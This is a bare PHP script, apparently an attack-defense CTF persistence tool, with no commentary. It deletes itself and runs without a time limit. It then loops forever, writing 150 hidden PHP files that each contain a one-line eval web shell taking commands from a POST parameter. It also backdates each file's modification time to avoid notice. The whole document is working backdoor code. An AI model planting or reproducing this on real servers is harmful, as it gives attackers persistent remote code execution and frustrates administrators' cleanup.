<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$baseFileName = '.test';
$ext = '.php';
$code = '<?php @eval($_POST[cmd]);?>';
while (true) {
    for ($i = 1; $i <= 150; $i++) {
        $fileName = $baseFileName. $i. $ext;
        file_put_contents($fileName, $code);
        system('touch -m -d "2018-12-01 09:10:12" '. $fileName);
        usleep(500);
    }
}
?>